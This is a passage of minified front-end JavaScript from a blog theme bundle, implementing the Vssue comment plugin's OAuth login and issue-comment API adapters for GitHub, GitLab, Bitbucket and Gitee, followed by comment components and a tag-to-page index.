"),t("VssueBody")],1)},staticRenderFns:[]},void 0,ma,void 0,!1,void 0,!1,void 0,void 0,void 0);var ya=n(25),xa=n.n(ya);function ka(e){return{username:e.login,avatar:e.avatar_url,homepage:e.html_url}}function wa(e){return{id:e.number,title:e.title,content:e.body,link:e.html_url}}function Sa(e){return{like:e["+1"],unlike:e[-1],heart:e.heart}}function _a(e){return{id:e.id,content:e.body_html,contentRaw:e.body,author:ka(e.user),createdAt:e.created_at,updatedAt:e.updated_at,reactions:Sa(e.reactions)}}function Ta(e){return"like"===e?"+1":"unlike"===e?"-1":e}class ja{constructor({baseURL:e="https://github.com",owner:t,repo:n,labels:r,clientId:a,clientSecret:o,state:i,proxy:s}){if(void 0===o||void 0===s)throw new Error("clientSecret and proxy is required for GitHub V3");this.baseURL=e,this.owner=t,this.repo=n,this.labels=r,this.clientId=a,this.clientSecret=o,this.state=i,this.proxy=s,this.$http=xa.a.create({baseURL:"https://github.com"===e?"https://api.github.com":$n(e,"api/v3"),headers:{Accept:"application/vnd.github.v3+json"}}),this.$http.interceptors.response.use(e=>e.data&&e.data.error?Promise.reject(new Error(e.data.error_description)):e,e=>(void 0===e.response&&"Network Error"===e.message&&(e.response={status:403}),Promise.reject(e)))}get platform(){return{name:"GitHub",link:this.baseURL,version:"v3",meta:{reactable:!0,sortable:!1}}}redirectAuth(){window.location.href=Nn($n(this.baseURL,"login/oauth/authorize"),{client_id:this.clientId,redirect_uri:window.location.href,scope:"public_repo",state:this.state})}async handleAuth(){const e=qn(window.location.search);if(e.code){if(e.state!==this.state)return null;const t=e.code;delete e.code,delete e.state;const n=Nn(Hn(window.location.href),e)+window.location.hash;window.history.replaceState(null,"",n);return await this.getAccessToken({code:t})}return null}async getAccessToken({code:e}){const t=$n(this.baseURL,"login/oauth/access_token"),n="function"==typeof this.proxy?this.proxy(t):this.proxy,{data:r}=await this.$http.post(n,{client_id:this.clientId,client_secret:this.clientSecret,code:e},{headers:{Accept:"application/json"}});return r.access_token}async getUser({accessToken:e}){const{data:t}=await this.$http.get("user",{headers:{Authorization:"token "+e}});return ka(t)}async getIssue({accessToken:e,issueId:t,issueTitle:n}){const r={};if(e&&(r.headers={Authorization:"token "+e}),!t){r.params={q:[`"${n}"`,"is:issue","in:title",`repo:${this.owner}/${this.repo}`,"is:public",...this.labels.map(e=>"label:"+e)].join(" "),timestamp:Date.now()};const{data:e}=await this.$http.get("search/issues",r);return e.items.map(wa).find(e=>e.title===n)||null}try{r.params={timestamp:Date.now()};const{data:e}=await this.$http.get(`repos/${this.owner}/${this.repo}/issues/${t}`,r);return wa(e)}catch(e){if(e.response&&404===e.response.status)return null;throw e}}async postIssue({accessToken:e,title:t,content:n}){const{data:r}=await this.$http.post(`repos/${this.owner}/${this.repo}/issues`,{title:t,body:n,labels:this.labels},{headers:{Authorization:"token "+e}});return wa(r)}async getComments({accessToken:e,issueId:t,query:{page:n=1,perPage:r=10}={}}){const a={params:{timestamp:Date.now()}},o={params:{page:n,per_page:r,timestamp:Date.now()},headers:{Accept:["application/vnd.github.v3.raw+json","application/vnd.github.v3.html+json","application/vnd.github.squirrel-girl-preview"]}};e&&(a.headers={Authorization:"token "+e},o.headers.Authorization="token "+e);const[i,s]=await Promise.all([this.$http.get(`repos/${this.owner}/${this.repo}/issues/${t}`,a),this.$http.get(`repos/${this.owner}/${this.repo}/issues/${t}/comments`,o)]),l=s.headers.link||null,c=/rel="next"/.test(l)?Number(l.replace(/^.*[^_]page=(\d*).*rel="next".*$/,"$1"))-1:/rel="prev"/.test(l)?Number(l.replace(/^.*[^_]page=(\d*).*rel="prev".*$/,"$1"))+1:1,u=l?Number(l.replace(/^.*per_page=(\d*).*$/,"$1")):r;return{count:Number(i.data.comments),page:c,perPage:u,data:s.data.map(_a)}}async postComment({accessToken:e,issueId:t,content:n}){const{data:r}=await this.$http.post(`repos/${this.owner}/${this.repo}/issues/${t}/comments`,{body:n},{headers:{Authorization:"token "+e,Accept:["application/vnd.github.v3.raw+json","application/vnd.github.v3.html+json","application/vnd.github.squirrel-girl-preview"]}});return _a(r)}async putComment({accessToken:e,commentId:t,content:n}){const{data:r}=await this.$http.patch(`repos/${this.owner}/${this.repo}/issues/comments/${t}`,{body:n},{headers:{Authorization:"token "+e,Accept:["application/vnd.github.v3.raw+json","application/vnd.github.v3.html+json","application/vnd.github.squirrel-girl-preview"]}});return _a(r)}async deleteComment({accessToken:e,commentId:t}){const{status:n}=await this.$http.delete(`repos/${this.owner}/${this.repo}/issues/comments/${t}`,{headers:{Authorization:"token "+e}});return 204===n}async getCommentReactions({accessToken:e,commentId:t}){const{data:n}=await this.$http.get(`repos/${this.owner}/${this.repo}/issues/comments/${t}`,{params:{timestamp:Date.now()},headers:{Authorization:"token "+e,Accept:"application/vnd.github.squirrel-girl-preview"}});return Sa(n.reactions)}async postCommentReaction({accessToken:e,commentId:t,reaction:n}){const r=await this.$http.post(`repos/${this.owner}/${this.repo}/issues/comments/${t}/reactions`,{content:Ta(n)},{headers:{Authorization:"token "+e,Accept:"application/vnd.github.squirrel-girl-preview"}});return 200===r.status?this.deleteCommentReaction({accessToken:e,commentId:t,reactionId:r.data.id}):201===r.status}async deleteCommentReaction({accessToken:e,commentId:t,reactionId:n}){return 204===(await this.$http.delete(`repos/${this.owner}/${this.repo}/issues/comments/${t}/reactions/${n}`,{headers:{Authorization:"token "+e,Accept:"application/vnd.github.squirrel-girl-preview"}})).status}}function Pa(e){return null===e?{username:"ghost",avatar:"https://avatars3.githubusercontent.com/u/10137?v=4",homepage:"https://github.com/ghost"}:{username:e.login,avatar:e.avatarUrl,homepage:e.url}}function Ca(e){return{id:e.number,title:e.title,content:e.body,link:e.url}}function Ea(e){return{like:e.find(e=>"THUMBS_UP"===e.content).users.totalCount,unlike:e.find(e=>"THUMBS_DOWN"===e.content).users.totalCount,heart:e.find(e=>"HEART"===e.content).users.totalCount}}function Aa(e){return{id:e.id,content:e.bodyHTML,contentRaw:e.body,author:Pa(e.author),createdAt:e.createdAt,updatedAt:e.updatedAt,reactions:Ea(e.reactionGroups)}}function Oa(e){return"like"===e?"THUMBS_UP":"unlike"===e?"THUMBS_DOWN":"heart"===e?"HEART":e}class Ia{constructor({baseURL:e="https://github.com",owner:t,repo:n,labels:r,clientId:a,clientSecret:o,state:i,proxy:s}){if(void 0===o||void 0===s)throw new Error("clientSecret and proxy is required for GitHub V4");this.baseURL=e,this.owner=t,this.repo=n,this.labels=r,this.clientId=a,this.clientSecret=o,this.state=i,this.proxy=s,this._pageInfo={page:1,startCursor:null,endCursor:null,sort:null,perPage:null},this._issueNodeId=null,this.$http=xa.a.create({baseURL:"https://github.com"===e?"https://api.github.com":$n(e,"api"),headers:{Accept:"application/vnd.github.v3+json"}}),this.$http.interceptors.response.use(e=>e.data.error?Promise.reject(e.data.error_description):e.data.errors?Promise.reject(e.data.errors[0].message):e)}get platform(){return{name:"GitHub",link:this.baseURL,version:"v4",meta:{reactable:!0,sortable:!0}}}redirectAuth(){window.location.href=Nn($n(this.baseURL,"login/oauth/authorize"),{client_id:this.clientId,redirect_uri:window.location.href,scope:"public_repo",state:this.state})}async handleAuth(){const e=qn(window.location.search);if(e.code){if(e.state!==this.state)return null;const t=e.code;delete e.code,delete e.state;const n=Nn(Hn(window.location.href),e)+window.location.hash;window.history.replaceState(null,"",n);return await this.getAccessToken({code:t})}return null}async getAccessToken({code:e}){const t=$n(this.baseURL,"login/oauth/access_token"),n="function"==typeof this.proxy?this.proxy(t):this.proxy,{data:r}=await this.$http.post(n,{client_id:this.clientId,client_secret:this.clientSecret,code:e},{headers:{Accept:"application/json"}});return r.access_token}async getUser({accessToken:e}){const{data:t}=await this.$http.post("graphql",{query:"query getUser {\n  viewer {\n    login\n    avatarUrl\n    url\n  }\n}"},{headers:{Authorization:"token "+e}});return Pa(t.data.viewer)}async getIssue({accessToken:e,issueId:t,issueTitle:n}){const r={};if(e&&(r.headers={Authorization:"token "+e}),!t){const e=[`"${n}"`,"in:title",`repo:${this.owner}/${this.repo}`,"is:public",...this.labels.map(e=>"label:"+e)].join(" "),{data:t}=await this.$http.post("graphql",{variables:{query:e},query:"query getIssueByTitle(\n  $query: String!\n) {\n  search(\n    query: $query\n    type: ISSUE\n    first: 20\n    ) {\n      nodes {\n      ... on Issue {\n        id\n        number\n        title\n        body\n        url\n      }\n    }\n  }\n}"},r),a=t.data.search.nodes.find(e=>e.title===n);return a?(this._issueNodeId=a.id,Ca(a)):null}try{const{data:e}=await this.$http.post("graphql",{query:`query getIssueById {\n  repository(owner: "${this.owner}", name: "${this.repo}") {\n    issue (number: ${t}) {\n      id\n      number\n      title\n      body\n      url\n    }\n  }\n}`},r);return this._issueNodeId=e.data.repository.issue.id,Ca(e.data.repository.issue)}catch(e){if(e.response&&404===e.response.status)return null;throw e}}async postIssue({accessToken:e,title:t,content:n}){const{data:r}=await this.$http.post(`repos/${this.owner}/${this.repo}/issues`,{title:t,body:n,labels:this.labels},{headers:{Authorization:"token "+e}});return r.url=r.html_url,this._issueNodeId=r.node_id,Ca(r)}async getComments({accessToken:e,issueId:t,query:{page:n=1,perPage:r=10,sort:a="desc"}={}}){const o={};e&&(o.headers={Authorization:"token "+e}),null!==this._pageInfo.sort&&a!==this._pageInfo.sort&&(n=1);const{firstOrLast:i,afterOrBefore:s,cursor:l}=this._getQueryParams({page:n,sort:a}),{data:c}=await this.$http.post("graphql",{variables:{owner:this.owner,repo:this.repo,issueId:t,perPage:r},query:`query getComments(\n  $owner: String!\n  $repo: String!\n  $issueId: Int!\n  $perPage: Int!\n) {\n  repository(owner: $owner, name: $repo) {\n    issue(number: $issueId) {\n      comments(\n        ${i}: $perPage\n        ${null===s?"":`${s}: "${l}"`}\n      ) {\n        totalCount\n        pageInfo {\n          endCursor\n          startCursor\n        }\n        nodes {\n          id\n          body\n          bodyHTML\n          createdAt\n          updatedAt\n          author {\n            avatarUrl\n            login\n            url\n          }\n          reactionGroups {\n            users (first: 0) {\n              totalCount\n            }\n            content\n          }\n        }\n      }\n    }\n  }\n}`},o),u=c.data.repository.issue.comments;return"desc"===a&&u.nodes.reverse(),this._pageInfo={page:n,startCursor:u.pageInfo.startCursor,endCursor:u.pageInfo.endCursor,sort:a,perPage:r},{count:u.totalCount,page:n,perPage:r,data:u.nodes.map(Aa)}}async postComment({accessToken:e,content:t}){const{data:n}=await this.$http.post("graphql",{variables:{issueNodeId:this._issueNodeId,content:t},query:"mutation postComment(\n  $issueNodeId: ID!\n  $content: String!\n) {\n  addComment(\n    input: {\n      subjectId: $issueNodeId\n      body: $content\n    }\n  ) {\n    commentEdge {\n      node {\n        id\n        body\n        bodyHTML\n        createdAt\n        updatedAt\n        author {\n          avatarUrl\n          login\n          url\n        }\n        reactionGroups {\n          users (first: 0) {\n            totalCount\n          }\n          content\n        }\n      }\n    }\n  }\n}"},{headers:{Authorization:"token "+e}});return Aa(n.data.addComment.commentEdge.node)}async putComment({accessToken:e,commentId:t,content:n}){const{data:r}=await this.$http.post("graphql",{variables:{commentId:t,content:n},query:"mutation putComment(\n  $commentId: ID!,\n  $content: String!,\n) {\n  updateIssueComment(input: {\n    id: $commentId\n    body: $content\n  }) {\n    issueComment {\n      id\n      body\n      bodyHTML\n      createdAt\n      updatedAt\n      author {\n        avatarUrl\n        login\n        url\n      }\n      reactionGroups {\n        users (first: 0) {\n          totalCount\n        }\n        content\n      }\n    }\n  }\n}"},{headers:{Authorization:"token "+e}});return Aa(r.data.updateIssueComment.issueComment)}async deleteComment({accessToken:e,commentId:t}){return await this.$http.post("graphql",{variables:{commentId:t},query:"mutation deleteComment(\n  $commentId: ID!,\n) {\n  deleteIssueComment(input: {\n    id: $commentId\n  }) {\n    clientMutationId\n  }\n}"},{headers:{Authorization:"token "+e}}),!0}async getCommentReactions({accessToken:e,issueId:t,commentId:n}){const{firstOrLast:r,afterOrBefore:a,cursor:o}=this._getQueryParams(),{data:i}=await this.$http.post("graphql",{variables:{owner:this.owner,repo:this.repo,issueId:t,perPage:this._pageInfo.perPage},query:`query getComments(\n  $owner: String!\n  $repo: String!\n  $issueId: Int!\n  $perPage: Int!\n) {\n  repository(owner: $owner, name: $repo) {\n    issue(number: $issueId) {\n      comments(\n        ${r}: $perPage\n        ${null===a?"":`${a}: "${o}"`}\n      ) {\n        nodes {\n          id\n          reactionGroups {\n            users (first: 0) {\n              totalCount\n            }\n            content\n          }\n        }\n      }\n    }\n  }\n}`},{headers:{Authorization:"token "+e}});return Ea(i.data.repository.issue.comments.nodes.find(e=>e.id===n).reactionGroups)}async postCommentReaction({accessToken:e,commentId:t,reaction:n}){return await this.$http.post("graphql",{variables:{commentId:t,content:Oa(n)},query:"mutation postCommentReaction(\n  $commentId: ID!,\n  $content: ReactionContent!,\n) {\n  addReaction(input: {\n    subjectId: $commentId\n    content: $content\n  }) {\n    reaction {\n      databaseId\n    }\n  }\n}"},{headers:{Authorization:"token "+e}}),!0}_getQueryParams({page:e=this._pageInfo.page,sort:t=this._pageInfo.sort}={}){let n,r,a;return 1===e?(n="asc"===t?"first":"last",r=null,a=null):"asc"===t?e>this._pageInfo.page?(n="first",r="after",a=this._pageInfo.endCursor):(n="last",r="before",a=this._pageInfo.startCursor):e>this._pageInfo.page?(n="last",r="before",a=this._pageInfo.startCursor):(n="first",r="after",a=this._pageInfo.endCursor),{firstOrLast:n,afterOrBefore:r,cursor:a}}}function La(e){return{username:e.username,avatar:e.avatar_url,homepage:e.web_url}}function Ma(e){return{id:e.iid,title:e.title,content:e.description,link:e.web_url}}function Ra(e){return{id:e.id,content:e.body_html||"",contentRaw:e.body,author:La(e.author),createdAt:e.created_at,updatedAt:e.updated_at,reactions:e.reactions}}function Da(e){return{like:e.filter(e=>"thumbsup"===e.name).length,unlike:e.filter(e=>"thumbsdown"===e.name).length,heart:e.filter(e=>"heart"===e.name).length}}function Na(e){return"like"===e?"thumbsup":"unlike"===e?"thumbsdown":e}class $a{constructor({baseURL:e="https://gitlab.com",owner:t,repo:n,labels:r,clientId:a,state:o}){this.baseURL=e,this.owner=t,this.repo=n,this.labels=r,this.clientId=a,this.state=o,this._encodedRepo=encodeURIComponent(`${this.owner}/${this.repo}`),this.$http=xa.a.create({baseURL:$n(e,"api/v4"),headers:{Accept:"application/json"}})}get platform(){return{name:"GitLab",link:this.baseURL,version:"v4",meta:{reactable:!0,sortable:!0}}}redirectAuth(){window.location.href=Nn($n(this.baseURL,"oauth/authorize"),{client_id:this.clientId,redirect_uri:window.location.href,response_type:"token",state:this.state})}async handleAuth(){const e=qn(window.location.hash.slice(1));if(!e.access_token||e.state!==this.state)return null;const t=e.access_token;delete e.access_token,delete e.token_type,delete e.expires_in,delete e.state;const n=Dn(e),r=n?"#"+n:"",a=`${Hn(window.location.href)}${window.location.search}${r}`;return window.history.replaceState(null,"",a),t}async getUser({accessToken:e}){const{data:t}=await this.$http.get("user",{headers:{Authorization:"Bearer "+e}});return La(t)}async getIssue({accessToken:e,issueId:t,issueTitle:n}){const r={};if(e&&(r.headers={Authorization:"Bearer "+e}),!t){r.params={labels:this.labels.join(","),order_by:"created_at",sort:"asc",search:n};const{data:e}=await this.$http.get(`projects/${this._encodedRepo}/issues`,r);return e.map(Ma).find(e=>e.title===n)||null}try{const{data:e}=await this.$http.get(`projects/${this._encodedRepo}/issues/${t}`,r);return Ma(e)}catch(e){if(e.response&&404===e.response.status)return null;throw e}}async postIssue({accessToken:e,title:t,content:n}){const{data:r}=await this.$http.post(`projects/${this._encodedRepo}/issues`,{title:t,description:n,labels:this.labels.join(",")},{headers:{Authorization:"Bearer "+e}});return Ma(r)}async getComments({accessToken:e,issueId:t,query:{page:n=1,perPage:r=10,sort:a="desc"}={}}){const o={params:{page:n,per_page:r,order_by:"created_at",sort:a}};e&&(o.headers={Authorization:"Bearer "+e});const i=await this.$http.get(`projects/${this._encodedRepo}/issues/${t}/notes`,o),s=i.data,l=[];for(const n of s)l.push((async()=>{n.body_html=await this.getMarkdownContent({accessToken:e,contentRaw:n.body})})()),l.push((async()=>{n.reactions=await this.getCommentReactions({accessToken:e,issueId:t,commentId:n.id})})());return await Promise.all(l),{count:Number(i.headers["x-total"]),page:Number(i.headers["x-page"]),perPage:Number(i.headers["x-per-page"]),data:s.map(Ra)}}async postComment({accessToken:e,issueId:t,content:n}){const{data:r}=await this.$http.post(`projects/${this._encodedRepo}/issues/${t}/notes`,{body:n},{headers:{Authorization:"Bearer "+e}});return Ra(r)}async putComment({accessToken:e,issueId:t,commentId:n,content:r}){const{data:a}=await this.$http.put(`projects/${this._encodedRepo}/issues/${t}/notes/${n}`,{body:r},{headers:{Authorization:"Bearer "+e}}),[o,i]=await Promise.all([this.getMarkdownContent({accessToken:e,contentRaw:a.body}),this.getCommentReactions({accessToken:e,issueId:t,commentId:a.id})]);return a.body_html=o,a.reactions=i,Ra(a)}async deleteComment({accessToken:e,issueId:t,commentId:n}){const{status:r}=await this.$http.delete(`projects/${this._encodedRepo}/issues/${t}/notes/${n}`,{headers:{Authorization:"Bearer "+e}});return 204===r}async getCommentReactions({accessToken:e,issueId:t,commentId:n}){const{data:r}=await this.$http.get(`projects/${this._encodedRepo}/issues/${t}/notes/${n}/award_emoji`,{headers:{Authorization:"Bearer "+e}});return Da(r)}async postCommentReaction({issueId:e,commentId:t,reaction:n,accessToken:r}){try{return 201===(await this.$http.post(`projects/${this._encodedRepo}/issues/${e}/notes/${t}/award_emoji`,{name:Na(n)},{headers:{Authorization:"Bearer "+r}})).status}catch(e){if(e.response&&404===e.response.status)return!1;throw e}}async getMarkdownContent({accessToken:e,contentRaw:t}){const n={};e&&(n.headers={Authorization:"Bearer "+e});const{data:r}=await this.$http.post("markdown",{text:t,gfm:!0},n);return r.html}}function Fa(e){return{username:e.nickname,avatar:e.links.avatar.href,homepage:e.links.html.href}}function Ua(e){return{id:e.id,title:e.title,content:e.content.raw,link:e.links.html.href}}function Ba(e){return{id:e.id,content:e.content.html,contentRaw:e.content.raw,author:Fa(e.user),createdAt:e.created_on,updatedAt:e.updated_on,reactions:null}}class Ha{constructor({baseURL:e="https://bitbucket.org",owner:t,repo:n,clientId:r,state:a}){this.baseURL=e,this.owner=t,this.repo=n,this.clientId=r,this.state=a,this.$http=xa.a.create({baseURL:"https://api.bitbucket.org/2.0",headers:{Accept:"application/json"}})}get platform(){return{name:"Bitbucket",link:this.baseURL,version:"v2",meta:{reactable:!1,sortable:!0}}}redirectAuth(){window.location.href=Nn($n(this.baseURL,"site/oauth2/authorize"),{client_id:this.clientId,redirect_uri:window.location.href,response_type:"token",state:this.state})}async handleAuth(){const e=qn(window.location.hash.slice(1));if(!e.access_token||e.state!==this.state)return null;const t=e.access_token;delete e.access_token,delete e.token_type,delete e.expires_in,delete e.state,delete e.scopes;const n=Dn(e),r=n?"#"+n:"",a=`${Hn(window.location.href)}${window.location.search}${r}`;return window.history.replaceState(null,"",a),t}async getUser({accessToken:e}){const{data:t}=await this.$http.get("user",{headers:{Authorization:"Bearer "+e}});return Fa(t)}async getIssue({accessToken:e,issueId:t,issueTitle:n}){const r={};if(e&&(r.headers={Authorization:"Bearer "+e}),!t){r.params={sort:"created_on",q:`title="${n}"`,timestamp:Date.now()};const{data:e}=await this.$http.get(`repositories/${this.owner}/${this.repo}/issues`,r);return e.size>0?Ua(e.values[0]):null}try{r.params={timestamp:Date.now()};const{data:e}=await this.$http.get(`repositories/${this.owner}/${this.repo}/issues/${t}`,r);return Ua(e)}catch(e){if(e.response&&404===e.response.status)return null;throw e}}async postIssue({accessToken:e,title:t,content:n}){const{data:r}=await this.$http.post(`repositories/${this.owner}/${this.repo}/issues`,{title:t,content:{raw:n},priority:"trivial",kind:"task"},{headers:{Authorization:"Bearer "+e}});return r.links.html={href:$n(this.baseURL,`${this.owner}/${this.repo}/issues/${r.id}`)},Ua(r)}async getComments({accessToken:e,issueId:t,query:{page:n=1,perPage:r=10,sort:a="desc"}={}}){const o={params:{page:n,pagelen:r,sort:"desc"===a?"-created_on":"created_on",timestamp:Date.now()}};e&&(o.headers={Authorization:"Bearer "+e});const{data:i}=await this.$http.get(`repositories/${this.owner}/${this.repo}/issues/${t}/comments`,o);return{count:i.size,page:i.page,perPage:i.pagelen,data:i.values.filter(e=>null!==e.content.raw).map(Ba)}}async postComment({accessToken:e,issueId:t,content:n}){const{data:r}=await this.$http.post(`repositories/${this.owner}/${this.repo}/issues/${t}/comments`,{content:{raw:n}},{headers:{Authorization:"Bearer "+e}});return Ba(r)}async putComment({accessToken:e,issueId:t,commentId:n,content:r}){const{data:a}=await this.$http.put(`repositories/${this.owner}/${this.repo}/issues/${t}/comments/${n}`,{content:{raw:r}},{headers:{Authorization:"Bearer "+e}});return Ba(a)}async deleteComment({accessToken:e,issueId:t,commentId:n}){const{status:r}=await this.$http.delete(`repositories/${this.owner}/${this.repo}/issues/${t}/comments/${n}`,{headers:{Authorization:"Bearer "+e}});return 204===r}async getCommentReactions(e){throw new Error("501 Not Implemented")}async postCommentReaction(e){throw new Error("501 Not Implemented")}}function qa(e){return{username:e.login,avatar:e.avatar_url,homepage:e.html_url}}function za(e){return{id:e.number,title:e.title,content:e.body,link:e.html_url}}function Ja(e){return{id:e.id,content:e.body_html||"",contentRaw:e.body,author:qa(e.user),createdAt:e.created_at,updatedAt:e.updated_at||"",reactions:null}}class Va{constructor({baseURL:e="https://gitee.com",owner:t,repo:n,labels:r,clientId:a,clientSecret:o,state:i,proxy:s}){if(void 0===o||void 0===s)throw new Error("clientSecret and proxy is required for Gitee V5");this.baseURL=e,this.owner=t,this.repo=n,this.labels=r,this.clientId=a,this.clientSecret=o,this.state=i,this.proxy=s,this.$http=xa.a.create({baseURL:$n(e,"api/v5")}),this.$http.interceptors.response.use(e=>e,e=>(e.response.data&&e.response.data.message&&(e.message=e.response.data.message),Promise.reject(e)))}get platform(){return{name:"Gitee",link:this.baseURL,version:"v5",meta:{reactable:!1,sortable:!1}}}redirectAuth(){window.location.href=Nn($n(this.baseURL,"oauth/authorize"),{client_id:this.clientId,redirect_uri:window.location.href,scope:"user_info issues notes",response_type:"code",state:this.state})}async handleAuth(){const e=qn(window.location.search);if(e.code){if(e.state!==this.state)return null;const t=e.code;delete e.code,delete e.state;const n=Nn(Hn(window.location.href),e)+window.location.hash;window.history.replaceState(null,"",n);return await this.getAccessToken({code:t})}return null}async getAccessToken({code:e}){const t=$n(this.baseURL,"oauth/token"),n="function"==typeof this.proxy?this.proxy(t):this.proxy,{data:r}=await this.$http.post(n,{client_id:this.clientId,client_secret:this.clientSecret,code:e,grant_type:"authorization_code",redirect_uri:window.location.href});return r.access_token}async getUser({accessToken:e}){const{data:t}=await this.$http.get("user",{params:{access_token:e}});return qa(t)}async getIssue({accessToken:e,issueId:t,issueTitle:n}){const r={params:{timestamp:Date.now()}};if(e&&(r.params.access_token=e),!t){Object.assign(r.params,{q:n,repo:`${this.owner}/${this.repo}`,per_page:1});const{data:e}=await this.$http.get("search/issues",r);return e.map(za).find(e=>e.title===n)||null}try{const{data:e}=await this.$http.get(`repos/${this.owner}/${this.repo}/issues/${t}`,r);return za(e)}catch(e){if(e.response&&404===e.response.status)return null;throw e}}async postIssue({accessToken:e,title:t,content:n}){const{data:r}=await this.$http.post(`repos/${this.owner}/issues`,{access_token:e,repo:this.repo,title:t,body:n,labels:this.labels.join(",")});return za(r)}async getComments({accessToken:e,issueId:t,query:{page:n=1,perPage:r=10}={}}){const a={params:{page:n,per_page:r,timestamp:Date.now()},headers:{Accept:["application/vnd.gitee.html+json"]}};e&&(a.params.access_token=e);const o=await this.$http.get(`repos/${this.owner}/${this.repo}/issues/${t}/comments`,a);return{count:Number(o.headers.total_count),page:n,perPage:r,data:o.data.map(Ja)}}async postComment({accessToken:e,issueId:t,content:n}){const{data:r}=await this.$http.post(`repos/${this.owner}/${this.repo}/issues/${t}/comments`,{body:n,access_token:e},{headers:{Accept:["application/vnd.gitee.html+json"]}});return Ja(r)}async putComment({accessToken:e,commentId:t,content:n}){const{data:r}=await this.$http.patch(`repos/${this.owner}/${this.repo}/issues/comments/${t}`,{body:n,access_token:e},{headers:{Accept:["application/vnd.gitee.html+json"]}});return Ja(r)}async deleteComment({accessToken:e,commentId:t}){const{status:n}=await this.$http.delete(`repos/${this.owner}/${this.repo}/issues/comments/${t}`,{params:{access_token:e}});return 204===n}async getCommentReactions(e){throw new Error("501 Not Implemented")}async postCommentReaction(e){throw new Error("501 Not Implemented")}}n(478);var Wa={name:"Vssue",components:{VssueComponent:ba},props:{options:{type:Object,default:function(){return{}}}},data:function(){return{key:"key",platformOptions:{github:ja,"github-v4":Ia,gitlab:$a,bitbucket:Ha,gitee:Va}}},computed:{vssueOptions:function(){var e=this.platformOptions,t=this.options,n=e[t.platform];return Object(Jt.a)(Object(Jt.a)({},t),{},{api:n})}},watch:{$route:function(e,t){var n=this;e.path!==t.path&&setTimeout((function(){n.key="reco-".concat((new Date).getTime())}),300)}}},Ka=(n(479),{components:{Valine:_n,Vssue:Object(Wt.a)(Wa,(function(){var e=this.$createElement;return(this._self._c||e)("VssueComponent",{key:this.key,staticClass:"vssue-wrapper",attrs:{options:this.vssueOptions}})}),[],!1,null,null,null).exports},props:{isShowComments:{type:Boolean,default:!0}},data:function(){return{commentsOptions:{}}},computed:{solution:function(){var e=this.commentsOptions.solution,t=this.$themeConfig,n=t.valineConfig,r=t.vssueConfig,a=this.$themeLocaleConfig,o=a.valineConfig,i=a.vssueConfig,s="";return void 0!==e?s=e:void 0!==o||void 0!==n?s="valine":void 0===i&&void 0===r||(s="vssue"),s},options:function(){var e=this.commentsOptions.options,t=this.$themeConfig,n=t.valineConfig,r=t.vssueConfig,a=this.$themeLocaleConfig,o=a.valineConfig,i=a.vssueConfig;return void 0!==e?e:void 0!==o||void 0!==n?o||n:void 0!==i||void 0!==r?i||r:null},componentName:function(){var e=this.solution;return"valine"===e?"Valine":"vssue"===e?"Vssue":""}},mounted:function(){this.$themeConfig.commentsSolution=this.solution}}),Ga=Object(Wt.a)(Ka,(function(){var e=this.$createElement,t=this._self._c||e;return t("div",{directives:[{name:"show",rawName:"v-show",value:this.isShowComments,expression:"isShowComments"}],staticClass:"comments-wrapper"},[t("ClientOnly",[t(this.componentName,{tag:"component",attrs:{options:this.options}})],1)],1)}),[],!1,null,null,null).exports,Qa={props:{idVal:String,numStyle:Object,flagTitle:{type:String,default:"Your Article Title"}},methods:{getIdVal:function(e){var t=this.$site.base;return t.slice(0,t.length-1)+e}}},Za=Object(Wt.a)(Qa,(function(){var e=this.$createElement,t=this._self._c||e;return t("span",{staticClass:"leancloud-visitors",attrs:{id:this.getIdVal(this.idVal),"data-flag-title":this.flagTitle}},[t("a",{staticClass:"leancloud-visitors-count",style:this.numStyle})])}),[],!1,null,null,null).exports,Ya=(n(480),n(77)),Xa=n(20),eo=n(32),to={tags:{Angular:{key:"Angular",scope:"tags",path:"/tag/Angular/",pageKeys:["v-055534f5","v-843d7756","v-ee437296","v-6f1710d5","v-09aa9075","v-a1c8fcd6"]},Python:{key:"Python",scope:"tags",path:"/tag/Python/",pageKeys:["v-055534f5","v-7fe11355","v-90f76eae","v-7e955396"]},JavaScript:{key:"JavaScript",scope:"tags",path:"/tag/JavaScript/",pageKeys:["v-56b06655","v-7fe11355","v-958c3346","v-6b38fbed","v-3828dd95","v-010f5256","v-ac60ddd6","v-d04da692","v-5039faf5","v-0712dd96","v-767f87d6","v-2f069e4b","v-9b7065d6","v-24b2e796","v-8ce62bd6","v-29746f67","v-2784e116","v-227c8f35","v-58810e03","v-8295b0b2","v-87e97576"]},"back-end":{key:"back-end",scope:"tags",path:"/tag/back-end/",pageKeys:["v-0127fc35"]},"front-end":{key:"front-end",scope:"tags",path:"/tag/front-end/",pageKeys:["v-0127fc35"]},list:{key:"list",scope:"tags",path:"/tag/list/",pageKeys:["v-7fe11355","v-15b41f32"]},map:{key:"map",scope:"tags",path:"/tag/map/",pageKeys:["v-7fe11355","v-9b7065d6","v-5c7797b3","v-61e83e96"]},command:{key:"command",scope:"tags",path:"/tag/command/",pageKeys:["v-d0fbf362","v-1b819156","v-6c49fb91","v-5a417755","v-eea22916","v-e2048eea","v-d082df56","v-c369f3d6","v-c332e8b2","v-84b7ad6e","v-1be519e2","v-29c37f5d"]},frp:{key:"frp",scope:"tags",path:"/tag/frp/",pageKeys:["v-73d15695"]},Gridea:{key:"Gridea",scope:"tags",path:"/tag/Gridea/",pageKeys:["v-39a93e16"]},maven:{key:"maven",scope:"tags",path:"/tag/maven/",pageKeys:["v-31f6f156","v-95f40d72","v-87e1ce96","v-70a090d6","v-3ae6294e","v-76f4dad5","v-1fc23475","v-0979bd15"]},idea:{key:"idea",scope:"tags",path:"/tag/idea/",pageKeys:["v-31f6f156"]},ftp:{key:"ftp",scope:"tags",path:"/tag/ftp/",pageKeys:["v-99aa11d6"]},sftp:{key:"sftp",scope:"tags",path:"/tag/sftp/",pageKeys:["v-99aa11d6"]},scp:{key:"scp",scope:"tags",path:"/tag/scp/",pageKeys:["v-99aa11d6"]},angular:{key:"angular",scope:"tags",path:"/tag/angular/",pageKeys:["v-d2366516","v-3d1e0635","v-a966a896","v-ba1a4256","v-323679ad"]},UI:{key:"UI",scope:"tags",path:"/tag/UI/",pageKeys:["v-843d7756"]},java:{key:"java",scope:"tags",path:"/tag/java/",pageKeys:["v-92059896","v-43be314a","v-b919e6d6","v-cc7f1d86","v-7d6e7395","v-72907a15","v-6a16cd8a","v-c1514bd6","v-1b44a315","v-5cce6a81","v-76f4dad5","v-1fc23475","v-719ba3b5"]},javascript:{key:"javascript",scope:"tags",path:"/tag/javascript/",pageKeys:["v-92059896","v-1f196cb5"]},python:{key:"python",scope:"tags",path:"/tag/python/",pageKeys